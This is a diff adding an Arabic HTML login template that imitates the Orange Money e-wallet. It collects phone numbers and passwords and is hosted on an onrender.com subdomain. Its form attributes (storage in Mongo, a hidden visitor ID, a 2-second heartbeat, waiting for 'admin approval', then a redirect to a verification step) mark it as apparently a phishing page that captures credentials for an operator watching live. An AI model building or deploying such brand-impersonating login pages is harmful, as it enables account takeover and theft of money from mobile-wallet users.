@@ -1,0 +1,693 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>خدمة Orange Money | محفظة إلكترونية</title>
+
+  <meta property="og:title" content="خدمة Orange Money | محفظة إلكترونية">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="https://o-5k7b.onrender.com/static/frontend/images/og-image.webp">
+  <meta property="og:image:type" content="image/webp">
+  <meta property="og:image:alt" content="خدمة Orange Money | محفظة إلكترونية">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="خدمة Orange Money | محفظة إلكترونية">
+  <meta name="twitter:image" content="https://o-5k7b.onrender.com/static/frontend/images/og-image.webp">
+  <meta name="twitter:image:alt" content="خدمة Orange Money | محفظة إلكترونية">
+
+  <style>
+    @font-face {
+      font-family: "Cairo";
+      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-Regular.ttf') }}") format("truetype");
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Cairo";
+      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-SemiBold.ttf') }}") format("truetype");
+      font-weight: 600;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Cairo";
+      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-Bold.ttf') }}") format("truetype");
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    :root {
+      --orange: #ff7900;
+      --orange-deep: #ef6c00;
+      --black: #020202;
+      --page: #f3f3f3;
+      --line: #a8a8a8;
+      --ink: #222222;
+      --muted: #808080;
+      --card: #ffffff;
+      --shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      --radius: 18px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Cairo", sans-serif;
+      background:
+        radial-gradient(circle at top center, rgba(255, 121, 0, 0.08), transparent 28%),
+        linear-gradient(180deg, #f8f8f8 0%, #f0f0f0 100%);
+      color: var(--ink);
+      overflow: hidden;
+    }
+
+    body.is-global-submitting {
+      overflow: hidden;
+    }
+
+    body.is-error-modal-open {
+      overflow: hidden;
+    }
+
+    .page {
+      min-height: 100vh;
+      height: 100vh;
+      display: flex;
+    }
+
+    .shell {
+      width: 100%;
+      max-width: none;
+      min-height: 100vh;
+      height: 100vh;
+      background: #ffffff;
+      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.03);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .brand {
+      background: var(--black);
+      padding: 20px 24px 24px;
+      min-height: 112px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      direction: ltr;
+    }
+
+    .brand img {
+      width: min(100%, 320px);
+      height: auto;
+      display: block;
+    }
+
+    .content {
+      flex: 1;
+      background: #ffffff;
+      width: min(100%, 520px);
+      margin: 0 auto;
+      padding: 16px 24px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .field {
+      position: relative;
+      padding-top: 18px;
+    }
+
+    .field-label {
+      position: absolute;
+      right: 4px;
+      top: 24px;
+      display: block;
+      font-size: 0.98rem;
+      color: #6f6f6f;
+      margin-bottom: 0;
+      pointer-events: none;
+      transform-origin: right top;
+      transition: color 0.18s ease, transform 0.18s ease, top 0.18s ease, font-size 0.18s ease;
+    }
+
+    html[dir="ltr"] .field-label {
+      right: auto;
+      left: 4px;
+      transform-origin: left top;
+    }
+
+    .field-input {
+      width: 100%;
+      border: 0;
+      border-bottom: 2px solid var(--line);
+      background: transparent;
+      padding: 0 0 10px;
+      font: inherit;
+      font-size: 1.45rem;
+      color: var(--ink);
+      outline: none;
+    }
+
+    .field.is-active .field-label,
+    .field.has-value .field-label {
+      top: 0;
+      font-size: 0.78rem;
+      transform: translateY(0);
+    }
+
+    .field.is-active .field-label {
+      color: var(--orange);
+    }
+
+    .field-phone .field-input {
+      direction: rtl;
+      text-align: right;
+      padding: 14px 4px 5px 0;
+      font-size: 0.98rem;
+    }
+
+    html[dir="ltr"] .field-phone .field-input,
+    html[dir="ltr"] .field-password .field-input {
+      direction: ltr;
+      text-align: left;
+      padding: 14px 0 5px 4px;
+    }
+
+    .field-input::placeholder {
+      color: transparent;
+    }
+
+    .field-input:focus {
+      border-bottom-color: var(--orange);
+    }
+
+    .hint {
+      margin: 0;
+      color: #8b8b8b;
+      font-size: 0.85rem;
+      line-height: 1.7;
+      min-height: 1.7em;
+      transition: color 0.18s ease;
+    }
+
+    .hint.is-hidden {
+      visibility: hidden;
+    }
+
+    .hint.error {
+      color: #d63939;
+    }
+
+    .field-password .field-input {
+      padding: 14px 4px 5px 0;
+      font-size: 0.98rem;
+      font-family: sans-serif;
+      line-height: 1.2;
+    }
+
+    .field-password .field-input.is-masked {
+      -webkit-text-security: disc;
+      letter-spacing: 0.18em;
+    }
+
+    .field-icon {
+      position: absolute;
+      left: 8px;
+      bottom: 8px;
+      width: 28px;
+      height: 28px;
+      opacity: 0.56;
+      cursor: pointer;
+    }
+
+    html[dir="ltr"] .field-icon {
+      left: auto;
+      right: 8px;
+    }
+
+    .forgot {
+      align-self: flex-start;
+      color: var(--orange-deep);
+      text-decoration: none;
+      font-size: 0.82rem;
+      border-bottom: 2px solid rgba(255, 121, 0, 0.75);
+      padding-bottom: 2px;
+    }
+
+    html[dir="ltr"] .forgot {
+      align-self: flex-end;
+    }
+
+    .primary {
+      border: 0;
+      border-radius: 6px;
+      background: #ff6e00;
+      color: #ffffff;
+      font: inherit;
+      font-weight: 700;
+      font-size: 0.96rem;
+      min-height: 60px;
+      box-shadow: 0 8px 18px rgba(255, 121, 0, 0.24);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .primary.is-loading {
+      opacity: 0.95;
+    }
+
+    .primary.is-loading span {
+      opacity: 0.9;
+    }
+
+    .primary.is-loading::after {
+      content: "";
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.45);
+      border-top-color: #ffffff;
+      animation: spin 0.8s linear infinite;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+
+    @keyframes spin {
+      from {
+        transform: translateY(-50%) rotate(0deg);
+      }
+      to {
+        transform: translateY(-50%) rotate(360deg);
+      }
+    }
+
+    body.is-global-submitting .shell {
+      pointer-events: none;
+      user-select: none;
+    }
+
+    .global-submit-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: rgba(17, 17, 17, 0.58);
+      backdrop-filter: blur(2px);
+      pointer-events: auto;
+    }
+
+    .global-submit-overlay[hidden] {
+      display: none !important;
+    }
+
+    .global-submit-overlay-card {
+      width: min(100%, 420px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      background: #ffffff;
+      border: 1px solid rgba(255, 255, 255, 0.75);
+      box-shadow: 0 24px 54px rgba(0, 0, 0, 0.22);
+      padding: 22px 22px 26px;
+      border-radius: 24px;
+      min-width: 0;
+      max-width: 420px;
+      gap: 12px;
+      color: #222222;
+      text-align: center;
+    }
+
+    .global-submit-spinner {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      border: 4px solid rgba(255, 121, 0, 0.18);
+      border-top-color: #ff6e00;
+      animation: global-spin 0.85s linear infinite;
+      flex-shrink: 0;
+    }
+
+    .global-submit-text {
+      margin: 0;
+      color: #1f2937;
+      font-size: 0.88rem;
+      font-weight: 600;
+      line-height: 1.8;
+      order: -1;
+    }
+
+    .reject-error-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 10001;
+      background: rgb(49 49 49 / 72%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 22px;
+      pointer-events: auto;
+    }
+
+    .reject-error-modal[hidden] {
+      display: none !important;
+    }
+
+    .reject-error-modal-card {
+      width: min(100%, 420px);
+      background: #ffffff;
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 18px 44px rgba(0, 0, 0, 0.28);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .reject-error-modal-body {
+      padding: 34px 26px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      text-align: center;
+    }
+
+    .reject-error-icon {
+      width: 100px;
+      height: 100px;
+      object-fit: contain;
+    }
+
+    .reject-error-message {
+      margin: 0;
+      color: #8a8a8a;
+      font-size: 0.9rem;
+      line-height: 1.65;
+      font-weight: 400;
+    }
+
+    .reject-error-close-btn {
+      width: 100%;
+      border: 0;
+      border-top: 1px solid #f1f1f1;
+      background: #ececec;
+      color: #d63f3f;
+      font: inherit;
+      font-size: 0.9rem;
+      font-weight: 600;
+      min-height: 62px;
+      cursor: pointer;
+    }
+
+    .reject-error-close-btn:focus-visible {
+      outline: 2px solid #d63f3f;
+      outline-offset: -2px;
+    }
+
+    @keyframes global-spin {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .primary img {
+      position: absolute;
+      left: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+      filter: brightness(0) invert(1);
+    }
+
+    html[dir="ltr"] .primary img {
+      left: auto;
+      right: 18px;
+    }
+
+    .split-actions {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 12px;
+    }
+
+    .secondary {
+      min-height: 58px;
+      border-radius: 6px;
+      font: inherit;
+      font-size: 0.9rem;
+      cursor: pointer;
+      box-shadow: var(--shadow);
+    }
+
+    .secondary.light {
+      background: #ffffff;
+      color: var(--ink);
+      border: 2px solid #000000;
+    }
+
+    .secondary.dark {
+      background: #040404;
+      color: #ffffff;
+      border: 2px solid #040404;
+    }
+
+    .face-id {
+      margin: 4px auto 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      color: #111111;
+    }
+
+    .face-id img {
+      width: 82px;
+      height: 82px;
+      object-fit: contain;
+    }
+
+    .face-id span {
+      font-size: 1rem;
+      font-weight: 600;
+    }
+
+    .footer-bar {
+      margin-top: auto;
+      background: #ececec;
+      border-radius: 0;
+      min-height: 74px;
+      display: flex;
+      align-items: center;
+      padding: 0 10px 0 18px;
+      position: relative;
+    }
+
+    .footer-bar .contact {
+      color: #999999;
+      font-size: 0.94rem;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .lang-btn {
+      min-width: 108px;
+      min-height: 42px;
+      border-radius: 12px;
+      border: 2px solid #000000;
+      background: #ffffff;
+      color: #111111;
+      font: inherit;
+      font-weight: 700;
+      font-size: 0.94rem;
+      box-shadow: var(--shadow);
+      cursor: pointer;
+      margin-left: auto;
+    }
+
+    html[dir="ltr"] .lang-btn {
+      margin-left: 0;
+      margin-right: auto;
+    }
+
+    .approval-status {
+      margin: 2px 0 0;
+      min-height: 1.2em;
+      font-size: 0.84rem;
+      color: #5f6368;
+      text-align: center;
+    }
+
+    .approval-status.is-hidden {
+      visibility: hidden;
+    }
+
+    .approval-status.is-error {
+      color: #d63939;
+    }
+
+    @media (max-width: 560px) {
+      .shell {
+        width: 100%;
+      }
+
+      .brand {
+        min-height: 104px;
+        padding: 18px 18px 22px;
+      }
+
+      .content {
+        padding: 14px 16px 14px;
+      }
+
+      .field-input {
+        font-size: 1.28rem;
+      }
+
+      .split-actions {
+        gap: 10px;
+      }
+
+      .secondary,
+      .primary {
+        min-height: 56px;
+      }
+
+      .reject-error-message {
+        font-size: 0.9rem;
+      }
+
+      .reject-error-close-btn {
+        font-size: 0.9rem;
+      }
+    }
+
+    @media (max-height: 900px) {
+      .brand {
+        min-height: 96px;
+        padding-bottom: 18px;
+      }
+
+      .brand img {
+        width: min(100%, 300px);
+      }
+
+      .content {
+        padding-top: 12px;
+        padding-bottom: 12px;
+        gap: 12px;
+      }
+
+      .face-id img {
+        width: 72px;
+        height: 72px;
+      }
+
+      .footer-bar {
+        min-height: 66px;
+      }
+    }
+  </style>
+</head>
+<body
+  data-heartbeat-interval-ms="2000"
+  data-eye-open-src="{{ url_for('static', path='frontend/images/ic_eye.svg') }}"
+  data-eye-closed-src="{{ url_for('static', path='frontend/images/ic_eye_hidden.svg') }}"
+  data-error-icon-src="{{ url_for('static', path='frontend/images/ic_error.svg') }}"
+>
+  <div class="page">
+    <main class="shell">
+      <header class="brand">
+        <img src="{{ url_for('static', path='frontend/images/orange_logo.svg') }}" alt="Orange Money">
+      </header>
+
+      <form
+        class="content"
+        id="login-form"
+        data-mongo-form
+        data-form-name="orange-money-login"
+        data-submit-validate="validateLoginForm"
+        data-await-admin-approval="true"
+        data-redirect-on-success="/verification"
+      >
+        <input id="visitor_id" name="visitor_id" type="hidden">
+        <label class="field field-phone">
+          <span class="field-label" data-i18n="phoneLabel">رقم الهاتف</span>
+          <input
+            class="field-input"
+            id="phone-input"
+            name="phone_number"
+            type="tel"
+            inputmode="numeric"
+            autocomplete="tel"
+            maxlength="10"
+            required
+          >
+        </label>
+
+        <p class="hint" id="phone-hint">الرجاء إدخال رقم الهاتف الذي يبدأ بـ 077 أو 078 أو 079.</p>
+
+        <label class="field field-password">
+          <span class="field-label" data-i18n="passwordLabel">كلمة السر</span>
+          <input
+            class="field-input is-masked"
+            id="password-input"
+            name="password"
+            type="password"
+            autocomplete="current-password"
+            minlength="6"
+            required
+          >
+          <img class="field-icon" id="password-toggle" src="{{ url_for('static', path='frontend/images/ic_eye_hidden.svg') }}" alt="إظهار كلمة السر">
+        </label>
+
+        <p class="hint is-hidden" id="password-hint">يرجى أدخال كلمة السر بشكل صحيح</p>
+
+        <a class="forgot" href="#" data-i18n="forgot">نسيت كلمة السر</a>
+
+        <button class="primary" type="submit">
+          <span data-i18n="signIn">تسجيل الدخول</span>
+          <img src="{{ url_for('static', path='frontend/images/ic_unlock.svg') }}" alt="">
+        </button>
+
+        <div class="split-actions">
+          <button class="secondary dark" type="button" data-i18n="selfRegistration">التسجيل الذاتي</button>
+          <button class="secondary light" type="button" data-i18n="firstTimeLogin">تسجيل الدخول لأول مرة</button>
+        </div>
+
+        <div class="face-id">
+          <img src="{{ url_for('static', path='frontend/images/Biometric_ID.svg') }}" alt="بصمة الوجه">
+          <span data-i18n="faceId">بصمة الوجه</span>
+        </div>
+      </form>
+
+      <footer class="footer-bar">
+        <button class="lang-btn" id="language-toggle" type="button">English</button>
+        <div class="contact" data-i18n="contact">تواصل معنا</div>
+      </footer>
+    </main>
+  </div>
+  <script src="{{ url_for('static', path='frontend/js/main.js') }}?v=20260315-2"></script>
+  <script src="{{ url_for('static', path='frontend/js/index.js') }}"></script>
+</body>
+</html>
